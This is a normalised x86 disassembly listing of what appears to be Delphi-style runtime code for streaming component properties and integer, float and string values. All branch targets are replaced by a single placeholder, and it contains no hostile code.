push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a80b7f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_3a65b90
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_3a82ccc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a80b86
lea eax [ ebp - 0x4 ]
call sub_3a65a7c
retn
sub_3a80b8c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x20 ] edx
xor eax eax
push ebp
push sub_3a80c1e
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0xe
mov eax [ ebp - 0x4 ]
call sub_3a82d84
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a81428
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a80c25
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
retn
mov eax edi
call sub_3a7b21c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
call sub_3a81420
mov edx esi
mov eax edi
call sub_3a7b224
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_3a81478
mov eax [ ebp - 0x4 ]
call sub_3a81428
inc esi
dec ebx
jne r-xdata
sub_3a80c2c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor esi esi
inc ebx
xor edi edi
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx edi
call sub_3a7a494
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a69490
test al al
jne r-xdata
sub_3a80c7c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_3a80dc3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
or [ eax + 0x1c ] 0x4
mov eax [ ebp - 0x8 ]
call sub_3a83ca4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_3a80c2c
pop ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_3a83c78
or [ eax + 0x1c ] 0x4
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
and [ eax + 0x1c ] 0xfffb
mov eax [ ebp - 0x8 ]
call sub_3a83ca4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_3a83c78
test [ eax + 0x24 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a80dca
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x20 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x28 ] edx
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x28
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x20 ] edx
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_3a83c78
and [ eax + 0x1c ] 0xfffb
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_3a83c78
test [ eax + 0x24 ] 0x4
je r-xdata
sub_3a80dd0
push ebp
mov ebp esp
add esp 0xfffffec8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x138 ] ecx
mov [ ebp - 0x12c ] ecx
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x134 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a811b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x8 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_3a64260
movzx eax [ ebp - 0x128 ]
add ebx eax
inc ebx
add ebx 0x5
add ebx 0x3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x10 ]
cmp ebx eax
jle r-xdata
sub ebx 0x4
mov ebx [ ebx ]
mov eax [ ebp - 0x4 ]
call sub_3a80924
mov [ ebp - 0xc ] eax
movzx eax [ r-xdata ]
mov [ ebp - 0x25 ] al
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a80ac0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
or [ ebp - 0x25 ] 0x1
or [ ebp - 0x25 ] 0x4
jmp r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
movzx edx [ ebp - 0x25 ]
mov eax [ ebp - 0x4 ]
call sub_3a81430
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x50 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
cmp eax [ ebx + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_3a64260
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x138 ]
call sub_3a65504
mov edx [ ebp - 0x138 ]
mov eax [ ebp - 0x4 ]
call sub_3a82b80
mov eax [ ebp - 0x8 ]
call sub_3a64258
call sub_3a645c0
call sub_3a76534
lea edx [ eax + 0xa ]
lea eax [ ebp - 0x130 ]
call sub_3a65504
push [ ebp - 0x130 ]
push r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_3a64260
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x134 ]
call sub_3a65504
push [ ebp - 0x134 ]
lea eax [ ebp - 0x12c ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x12c ]
mov eax [ ebp - 0x4 ]
call sub_3a82b80
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
or [ ebp - 0x25 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a81478
mov eax [ ebp - 0x4 ]
call sub_3a81428
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_3a81153
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x34 ]
cmp edx [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a82b80
mov eax [ ebp - 0x4 ]
call sub_3a80924
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
or [ ebp - 0x25 ] 0x2
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_3a7a494
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x20 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8115a
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x1c ]
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x28 ] edx
retn
xor eax eax
push ebp
push sub_3a81111
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
push eax
push sub_3a80c7c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov si 0xfffd
call sub_3a6457c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_3a64380
retn
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp - 0x4 ]
push eax
push sub_3a808c4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov si 0xfffd
call sub_3a6457c
test [ ebx + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] ebx
sub_3a8115a
mov eax [ ebp - 0x4 ]
call sub_3a81428
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a811bb
lea eax [ ebp - 0x138 ]
mov edx 0x4
call sub_3a652c4
retn
movzx eax [ r-xdata ]
cmp al [ ebp - 0x25 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a80924
mov edx [ ebp - 0x10 ]
add edx 0x2
cmp eax edx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_3a80998
sub_3a811d8
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x28 ] ecx
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x18 ] esi
mov [ ebx + 0x1c ] esi
mov eax ebx
call sub_3a82b70
mov edx esi
mov eax ebx
call sub_3a80c7c
pop esi
pop ebx
retn
sub_3a81200
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x5
mov eax ebx
call sub_3a82d84
lea edx [ ebp + 0x8 ]
mov ecx 0xa
mov eax ebx
call sub_3a809ec
pop ebx
pop ebp
retn 0xc
sub_3a81224
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0xf
mov eax ebx
call sub_3a82d84
lea edx [ ebp + 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_3a809ec
pop ebx
pop ebp
retn 0x4
sub_3a81248
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x10
mov eax ebx
call sub_3a82d84
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_3a809ec
pop ebx
pop ebp
retn 0x8
sub_3a8126c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x11
mov eax ebx
call sub_3a82d84
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_3a809ec
pop ebx
pop ebp
retn 0x8
sub_3a81290
push ebx
push esi
mov esi edx
mov ebx eax
mov edx r-xdata
mov eax esi
call sub_3a69490
test al al
je r-xdata
mov edx r-xdata
mov eax esi
call sub_3a69490
test al al
je r-xdata
mov dl 0x8
mov eax ebx
call sub_3a82d84
pop esi
pop ebx
retn
mov edx r-xdata
mov eax esi
call sub_3a69490
test al al
je r-xdata
mov dl 0x9
mov eax ebx
call sub_3a82d84
jmp r-xdata
mov edx r-xdata
mov eax esi
call sub_3a69490
test al al
je r-xdata
xor edx edx
mov eax ebx
call sub_3a82d84
jmp r-xdata
pop esi
pop ebx
retn
mov dl 0x7
mov eax ebx
call sub_3a82d84
mov edx esi
mov eax ebx
call sub_3a82b80
mov dl 0xd
mov eax ebx
call sub_3a82d84
jmp r-xdata
sub_3a81354
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_3a82d84
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_3a809ec
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_3a82d84
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_3a809ec
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_3a82d84
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_3a809ec
jmp r-xdata
pop edx
pop ebx
retn
sub_3a813c8
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov dl 0x13
mov eax ebx
call sub_3a82d84
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_3a809ec
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ebx
call sub_3a81354
jmp r-xdata
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_3a81430
push ebx
push esi
push ecx
mov esi ecx
mov [ esp ] dl
mov ebx eax
movzx eax [ r-xdata ]
cmp al [ esp ]
je r-xdata
pop edx
pop esi
pop ebx
retn
movzx eax [ esp ]
or al 0xf0
mov [ esp + 0x1 ] al
lea edx [ esp + 0x1 ]
mov ecx 0x1
mov eax ebx
call sub_3a809ec
test [ esp ] 0x2
je r-xdata
mov edx esi
mov eax ebx
call sub_3a81354
sub_3a81478
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_3a645c0
call sub_3a76534
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
add eax eax
add eax eax
call sub_3a62ee0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_3a81527
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_3a645c0
mov edx [ ebp - 0x10 ]
call sub_3a76738
mov esi [ ebp - 0xc ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0xc ]
add edx edx
add edx edx
mov eax [ ebp - 0x10 ]
call sub_3a62efc
retn
inc esi
xor edi edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_3a7678c
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a825c8
mov eax [ ebp - 0x10 ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
sub_3a81540
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_3a64258
mov edx eax
mov eax [ edi ]
call sub_3a645ac
test al al
jne r-xdata
mov al 0x1
sub_3a81570
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a767bc
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax 0x80000000
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_3a767bc
cmp ebx eax
sete al
pop ebx
pop ebp
retn
xor eax eax
jmp r-xdata
cmp eax ebx
je r-xdata
pop ebx
pop ebp
retn
mov al 0x1
sub_3a815c8
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a76e24
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
sete al
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_3a76e24
fld [ ebp - 0x10 ]
fcompp
fwait
fnstsw ax
sahf
sete al
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_3a81624
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a77240
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_3a77240
cmp edx [ ebp - 0x4 ]
jne r-xdata
sete al
cmp [ ebp - 0x8 ] 0x0
sete al
jmp r-xdata
cmp eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_3a8167c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_3a816fb
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a76c64
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_3a65c08
sete bl
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_3a76c64
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a65c08
sete bl
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a81702
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a65a94
retn
sub_3a8170c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
pop esi
pop ebx
pop ebp
retn
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_3a69490
test al al
jne r-xdata
mov al 0x1
sub_3a8174c
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
sete al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_3a767bc
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
call sub_3a8170c
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
sub_3a817a4
push ebp
mov ebp esp
push ecx
push ebx
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a767bc
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
push ebp
call sub_3a8174c
pop ecx
test al al
jne r-xdata
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
push ebp
call sub_3a8174c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
sub_3a81824
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_3a818d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
sete bl
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a818d7
lea eax [ ebp - 0x8 ]
call sub_3a66cb4
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_3a772a4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebp - 0x4 ]
sete bl
test bl bl
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_3a66cb4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a6efcc
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_3a8170c
pop ecx
mov ebx eax
sub_3a818f0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_3a819ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a772a4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_3a66cb4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a6efcc
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a819b4
lea eax [ ebp - 0x10 ]
call sub_3a66cb4
lea eax [ ebp - 0xc ]
call sub_3a66cb4
lea eax [ ebp - 0x4 ]
call sub_3a66cb4
retn
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_3a772a4
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
call sub_3a81824
pop ecx
test al al
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
sub_3a819cc
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov eax ebx
call sub_3a652a0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xa ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
push ebx
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
lea ecx [ ebp - 0x8 ]
mov eax [ esi + 0x4 ]
call [ esi ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov eax [ eax ]
mov edx [ ebp - 0x8 ]
call sub_3a64654
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_3a65504
sub_3a81a38
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_3a81ac7
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3a771c8
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp ebx [ ebp - 0x8 ]
je r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_3a771c8
